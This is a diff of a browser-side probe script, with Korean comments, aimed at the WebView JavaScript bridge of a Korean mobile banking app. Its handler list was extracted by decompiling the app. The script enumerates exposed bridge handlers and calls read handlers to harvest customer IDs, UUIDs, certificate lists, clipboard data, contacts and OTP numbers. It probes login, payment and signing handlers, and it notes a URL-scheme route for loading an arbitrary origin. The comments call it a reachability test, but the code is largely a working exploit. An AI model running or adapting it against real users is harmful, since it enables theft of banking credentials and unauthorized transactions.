@@ -24,87 +24,144 @@
 const L=(s,c)=>{const d=document.getElementById('log');d.innerHTML+=(c?`<span class="${c}">${s}</span>`:s)+"\n";};
 L("오리진: "+location.href,"muted");L("—".repeat(46));
 
-// 역분석으로 확정된 대상 앱 JS브리지 메서드 74개 전체
-// 노출 위치: Projects/Feature/Channel/Implement/JavaScriptService/call*.swift
-//           디스패처: ChannelWebBridgeCommand.swift
-const ALL=["callAppIronAuth","callArsPhone","callCertConfirmArray","callCertDelete","callCertList",
-"callCertPdfSign","callCertUbikey","callCommonCertUpdate","callContactMulti","callCreateAutoLoginUuid",
-"callCreateUuid","callDeleteAutoLoginUuid","callDeviceHaptic","callExistAutoLoginUuid","callEzl",
-"callGetClipboardId","callGetPushSettings","callGetSetting","callGetSteps","callIsCalling",
-"callIsDeviceLock","callIsVoiceOver","callKbankGetSetting","callKbankHaptic","callKbankSetSetting",
-"callKeypad","callLogin","callMPKISignWithAttr","callMobileIDApp","callMotpCheckPw","callMotpDelete",
-"callMotpExist","callMotpKeyChange","callMotpKeyChangePw","callMotpNumber","callMpkiBioCheck",
-"callMpkiBioRegComplete","callMpkiDiscard","callMpkiGetAllInfo","callMpkiGetBioSignature","callMpkiIssue",
-"callMpkiIssueSave","callMpkiSign","callNativeLogin","callNativeRestAPI","callNonLoginPay",
-"callNormalSaveFile","callOTACDeregister","callOTACGetRegistrationMessage","callOTACGetVerifyMessage",
-"callOTACRegister","callOpenBrowser","callPageFinished","callPhoneInfo","callPhotoGallery",
-"callRequestFdsCollectionServer","callSTT","callSaveFile","callSaveImage","callScrapingBig",
-"callScrapingMulti","callSetPushSettings","callSetSetting","callShowAppStoreRatingPopup",
-"callSimpleCertCheckPin","callSimpleCertDelete","callSimpleCertList","callSimpleCertPasswordChange",
-"callStartApp","callWebViewClose","callWebViewLoad","callWebViewOpen","callZeropayRsltReq","callZeropayTranReq"];
-// 값 반환(READ) — probe로 값 탈취 시도
-const READ=["callKbankGetSetting","callGetSetting","callGetClipboardId","callPhoneInfo","callExistAutoLoginUuid",
-"callMpkiGetAllInfo","callCertList","callSimpleCertList","callGetPushSettings","callGetSteps","callMotpExist",
-"callMotpNumber","callIsCalling","callIsDeviceLock","callIsVoiceOver","callCreateUuid","callCertConfirmArray",
-"callOTACGetRegistrationMessage","callOTACGetVerifyMessage","callArsPhone","callPageFinished"];
-// 민감 ACTION — 열거만(실행 안 함)
-const ACTION=["callLogin","callNativeLogin","callNonLoginPay","callZeropayTranReq","callZeropayRsltReq",
-"callMpkiSign","callMPKISignWithAttr","callMpkiGetBioSignature","callMpkiIssue","callMpkiIssueSave",
-"callCreateAutoLoginUuid","callDeleteAutoLoginUuid","callOTACRegister","callOTACDeregister",
-"callSimpleCertCheckPin","callSimpleCertPasswordChange","callMotpKeyChangePw","callSetSetting",
-"callAppIronAuth","callNativeRestAPI","callScrapingBig","callScrapingMulti","callSaveFile","callStartApp"];
+/* ────────────────────────────────────────────────────────────────────────
+ * Ghidra 디컴파일로 확정 (SmartBank_Product, arm64)
+ *  - 등록: FeatureChannel.ChannelViewController viewDidLoad → FUN_10032753c
+ *          WKUserContentController.addScriptMessageHandler(self, name:) 를 115회(0x73) 루프 등록
+ *          enum 테이블 DAT_1033dd330(115개) → rawValue 문자열이 핸들러명
+ *  - 수신: ChannelViewController.userContentController:didReceiveScriptMessage:  (0x100333188)
+ *          message.name = 커맨드(아래 call*),  message.body = JSON 문자열(파라미터)
+ *          → ReactorKit Reactor Action 으로 래핑(PassthroughSubject.send) → UseCase 디스패치
+ *  - JS 호출형:  window.webkit.messageHandlers.<call*>.postMessage('<JSON파라미터>')
+ *  - enum rawValue 블록: __cstring 0x102525f12 ~ 0x102526962 (ChannelWebBridgeCommand)
+ * ──────────────────────────────────────────────────────────────────────── */
+
+// [A] ChannelViewController 브릿지 — 실제 등록되는 핸들러 전체(케이싱 정확, 디컴파일 추출)
+const ALL=[
+ "callSTT","callArsPhone","callShowLoading","callLoadingViewShow","callLoadingViewHide",
+ "callWebViewOpen","callWebViewClose","callWebViewLoad","callExternalWebView","callPhotoGallery",
+ "callIDCardOcr","callQRScan","callLogin","callUserLogout","callGetSetting","callSetSetting",
+ "callKbankGetSetting","callKbankSetSetting","callExternalSetting","callGetPushSettings","callSetPushSettings",
+ "callGetColorTheme","callSetColorTheme","callGetLanguage","callSetLanguage","callGetSteps",
+ "callCreateUuid","callCreateAutoLoginUuid","callSaveAutoLoginUuid","callExistAutoLoginUuid","callDeleteAutoLoginUuid",
+ "callGetClipBoard","callGetClipBoardId","callIsDeviceLock","callIsVoiceOver","callIsCalling",
+ "callDeviceHaptic","callKbankHaptic","callStatusBarStyle","callSetBrightness","callCheckScheme",
+ "callStartApp","callMobileIDApp","callOpenBrowser","callSendSms","callSendMore","callKbankShare",
+ "callShareSns","callGetContact","callContact","callContactMulti","callTransferWidget",
+ "callSaveImage","callSaveFile","callNormalSaveFile","callPageFinished","callCacheClear",
+ "callShowAppStoreRatingPopup","callShowMiniGame","callShowRewardVideo","callFlowControlState",
+ "callKeypad","callCloseKeypad","callFaceAuth","callAppIronAuth","callNativeRestAPI",
+ "callScrapingBig","callScrapingMulti","callRequestFdsCollectionServer","callEzl",
+ // 인증서(공동/금융인증)
+ "callCertList","callCertConfirmArray","callCertDelete","callCertUbikey","callCertUbikeySave","callCertPdfSign",
+ "callCommonCertInfo","callCommonCertIssue","callCommonCertImport","callCommonCertExport",
+ "callCommonCertUpdate","callCommonCertPasswordChange",
+ "callSimpleCertList","callSimpleCertIssue","callSimpleCertCheckPin","callSimpleCertDelete","callSimpleCertPasswordChange",
+ // MPKI(모바일 사설인증) / 서명
+ "callMPKIBioCheck","callMPKIBioRegComplete","callMPKIIssue","callMPKIIssueSave","callMPKIDiscard",
+ "callMPKIgetAllInfo","callMPKIgetBioSignature","callMPKISign","callMPKISignWithAttr",
+ // MOTP(일회용비번)
+ "callMotpExist","callMotpNumber","callMotpCheckPw","callMotpSavePassword","callMotpDelete",
+ "callMotpKeyChange","callMotpKeyChangePassword",
+ // OTAC
+ "callOtacRegister","callOtacDeregister","callOtacGetRegistrationMessage","callOtacGetVerifyMessage",
+ // 결제
+ "callNonLoginPay","callZeroPayTranReq","callZeroPayRsltReq","callPayCodeCreate"];
+
+// [B] FeatureExternal.ExternalWebView 브릿지(별도 핸들러 세트 — 케이싱/명칭 상이, 0x10219cxx~0x10219dxx)
+const EXTERNAL=[
+ "callLoadingViewShow","callLoadingViewHide","callWebViewOpen","callWebViewClose","callWebViewLoad",
+ "callExternalWebView","callPhotoGallery","callIDCardOcr","callQRScan","callDeviceHaptic",
+ "callGetContact","callShareSNS","callMobileIDApp","callPageFinished","callNativeRestAPI",
+ "callSetStatusBarFontColor","callShowAppStoreRatingPopup",
+ "callMPKIBioCheck","callMPKIIssue","callMPKIIssueSave","callMPKIDiscard","callMPKIgetAllInfo",
+ "callMPKIBioRegComplete","callMPKISign","callMPKISignWithAttr","callMPKIgetBioSignature",
+ "callCommonCertInfo","callCommonCertUpdate","callCommonCertIssue","callCommonCertImport",
+ "callCommonCertExport","callCommonCertPwdChange",
+ "callRequestFDSCollectionServer",
+ "callOTACRegister","callOTACDeregister","callOTACGetRegistrationMessage","callOTACGetVerificationMessage"];
+
+// [C] 웹뷰 로드형 — ukbanksmartbankweb://channel?url= 연계 공격면(임의 origin 로드 → 브릿지 접근)
+const WEBOPEN=["callWebViewOpen","callWebViewLoad","callExternalWebView","callOpenBrowser"];
+
+// 값 반환(READ) — probe로 값(식별자/인증정보) 탈취 가능 여부 확인
+const READ=[
+ "callKbankGetSetting","callGetSetting","callGetClipBoard","callGetClipBoardId","callGetContact","callContact","callContactMulti",
+ "callGetPushSettings","callGetSteps","callGetColorTheme","callGetLanguage","callCertList","callSimpleCertList",
+ "callMPKIgetAllInfo","callMPKIgetBioSignature","callExistAutoLoginUuid","callMotpExist","callMotpNumber",
+ "callIsCalling","callIsDeviceLock","callIsVoiceOver","callCreateUuid","callCommonCertInfo","callCommonCertExport",
+ "callCertConfirmArray","callOtacGetRegistrationMessage","callOtacGetVerifyMessage","callArsPhone","callCheckScheme","callPageFinished","callFlowControlState"];
+
+// 민감 ACTION — 열거만(실행 안 함): 인증/서명/결제/파일/설정변경
+const ACTION=[
+ "callLogin","callUserLogout","callNonLoginPay","callZeroPayTranReq","callZeroPayRsltReq","callPayCodeCreate",
+ "callMPKISign","callMPKISignWithAttr","callMPKIIssue","callMPKIIssueSave","callMPKIDiscard","callMPKIBioCheck","callMPKIBioRegComplete",
+ "callCertPdfSign","callCertUbikey","callCertUbikeySave","callCertDelete","callCommonCertIssue","callCommonCertImport",
+ "callCommonCertUpdate","callCommonCertPasswordChange","callSimpleCertCheckPin","callSimpleCertDelete","callSimpleCertPasswordChange","callSimpleCertIssue",
+ "callMotpKeyChange","callMotpKeyChangePassword","callMotpDelete","callMotpCheckPw","callMotpSavePassword",
+ "callCreateAutoLoginUuid","callSaveAutoLoginUuid","callDeleteAutoLoginUuid","callOtacRegister","callOtacDeregister",
+ "callAppIronAuth","callFaceAuth","callKeypad","callNativeRestAPI","callScrapingBig","callScrapingMulti",
+ "callSaveFile","callNormalSaveFile","callSaveImage","callStartApp","callMobileIDApp","callSendSms",
+ "callSetSetting","callKbankSetSetting","callSetPushSettings","callSetColorTheme","callSetLanguage","callExternalSetting",
+ "callEzl","callSetBrightness","callCacheClear","callRequestFdsCollectionServer"];
+
 // 디스패처 핸들러명 후보 (단일핸들러+method 디스패치형일 때)
 const DISPATCHERS=["smartbank","kbank","Kbank","SmartBank","native","nativeBridge","KbankBridge",
-  "JavaScriptService","kbankWebView","windowLoaded","iOS"];
+  "JavaScriptService","kbankWebView","windowLoaded","iOS","consoleLog"];
 
 // 반환값 포착: 네이티브가 어떤 콜백을 부르든 잡도록 window에 catch-all 설치
 window.__rt=(tag,val)=>{const s=String(val).slice(0,160);
-  const sens=/custid|cust_id|member|uuid|phone|ssn|account|cert/i.test(tag+val);
+  const sens=/custid|cust_id|member|uuid|phone|ssn|account|cert|token|signature|clip/i.test(tag+val);
   L(`[응답] ${tag} = ${s}`+(sens?"  ⚠️ 민감값!":""),sens?"bad":"ok");};
 // 흔한 콜백명들을 __rt로 연결(네이티브가 이 이름들로 돌려줄 수 있음)
 ["nativeCallback","bridgeCallback","onNativeResult","webkitCallback","kbankCallback",
- "callback","jsCallback","resultCallback"].forEach(n=>{try{window[n]=(...a)=>window.__rt(n,a.join(","));}catch(e){}});
+ "callback","jsCallback","resultCallback","callBackId"].forEach(n=>{try{window[n]=(...a)=>window.__rt(n,a.join(","));}catch(e){}});
 
 const mh=(window.webkit&&window.webkit.messageHandlers)||{};
 function send(h,payload){try{if(mh[h]){mh[h].postMessage(payload);return true;}}catch(e){}return false;}
 
 // 1) 각 READ 메서드를 (a)개별 핸들러로 (b)디스패처+method 로 호출
-L("[READ] 값 반환 시도:","muted");
+L(`[READ] 값 반환 시도 (${READ.length}개):`,"muted");
 READ.forEach(m=>{
   let hit=false;
-  // (a) 메서드명 자체가 핸들러명인 경우
-  hit|=send(m,{param:"custid",callback:"nativeCallback",callbackId:"__rt"});
+  // (a) 메서드명 자체가 핸들러명인 경우 — body는 JSON 문자열
+  hit|=send(m,JSON.stringify({param:"custid",callBackId:"__rt",callback:"nativeCallback"}));
   hit|=send(m,"custid");
   // (b) 디스패처 핸들러에 method 필드로
-  DISPATCHERS.forEach(d=>{hit|=send(d,JSON.stringify({method:m,data:{key:"custid"},callback:"nativeCallback"}));});
+  DISPATCHERS.forEach(d=>{hit|=send(d,JSON.stringify({method:m,data:{key:"custid"},callBackId:"__rt",callback:"nativeCallback"}));});
   L(`  ${m}: ${hit?"전송됨 → [응답] 확인":"핸들러 없음"}`,hit?"ok":"muted");
 });
 
 // 2) 노출된 핸들러 열거
 L("—".repeat(46));
 let names=[];try{names=Object.keys(mh);}catch(e){}
-[...ALL,...DISPATCHERS].forEach(n=>{if(mh[n])names.push(n);});
+[...ALL,...EXTERNAL,...DISPATCHERS].forEach(n=>{if(mh[n])names.push(n);});
 names=[...new Set(names)];
-L(`노출된 브릿지 핸들러 (전체 ${ALL.length}개 중 탐지): `+(names.length?names.join(", "):"(열거 불가)"),names.length?"bad":"muted");
+L(`노출된 브릿지 핸들러 (후보 ${[...new Set([...ALL,...EXTERNAL])].length}개 중 탐지): `+(names.length?names.join(", "):"(열거 불가)"),names.length?"bad":"muted");
 
-// 3) ACTION — 도달 확증 probe: 무효 파라미터만 보내 '핸들러가 디스패치되는지'를 응답으로 확인.
+// 3) 웹뷰 로드형 — 임의 origin 로드 연계(열거만)
+L("—".repeat(46));
+L("[WEBOPEN] 임의 URL 로드형(열거만): "+WEBOPEN.filter(h=>mh[h]).join(", ")+"  ※ ukbanksmartbankweb://channel?url= 연계면 브릿지 전체 노출","muted");
+
+// 4) ACTION — 도달 확증 probe: 무효 파라미터만 보내 '핸들러가 디스패치되는지'를 응답으로 확인.
 //    ※ 유효한 결제/서명 파라미터는 절대 안 보냄 → 실제 거래/서명 미발생.
 //    ※ 반드시 '확실히 격리된 샌드박스'에서만 실행할 것.
 L("—".repeat(46));
-L("[ACTION] 도달 확증 probe (무효 파라미터 — 실제 실행 아님):","muted");
+L(`[ACTION] 도달 확증 probe (${ACTION.length}개, 무효 파라미터 — 실제 실행 아님):`,"muted");
 ACTION.forEach(m=>{
   const ack="__ack_"+m.replace(/[^A-Za-z0-9]/g,"");
   // 네이티브가 이 ack 콜백을 부르면 = 해당 메서드 핸들러가 실제로 디스패치됨 = 도달 확증
   try{window[ack]=(...a)=>L(`  ${m}: 도달 확증 ✅ (응답=${String(a.join(",")).slice(0,60)})`,"bad");}catch(e){}
-  const probe={__probe:"reachability-only",callback:ack};   // 유효 거래값 없음 → 정상 핸들러면 거부
+  const probe=JSON.stringify({__probe:"reachability-only",callBackId:ack,callback:ack});   // 유효 거래값 없음 → 정상 핸들러면 거부
   let sent=send(m,probe);
-  DISPATCHERS.forEach(d=>{sent=send(d,JSON.stringify({method:m,data:{__probe:"reachability-only"},callback:ack}))||sent;});
+  DISPATCHERS.forEach(d=>{sent=send(d,JSON.stringify({method:m,data:{__probe:"reachability-only"},callBackId:ack,callback:ack}))||sent;});
   L(`  ${m}: ${sent?"probe 전송 → 응답 오면 도달 확증":(names.length?"도달 가능성(추론)":"핸들러 없음")}`,
     sent?"muted":(names.length?"bad":"muted"));
 });
 
 L("—".repeat(46));
-L("판정: [응답]에 custid/uuid 뜨면 = 오리진검증 없음(#1 취약). 서버로그 히트 = 스킴 하이재킹 성립.","muted");
+L("판정: [응답]에 custid/uuid/token/signature 뜨면 = 오리진검증 없음(#1 취약). 서버로그 히트 = 스킴 하이재킹 성립.","muted");
+L(`커맨드 모델: message.name=핸들러명, message.body=JSON문자열 → Reactor → UseCase. 등록 115개(FUN_10032753c).`,"muted");
 </script>
 </body>
 </html>
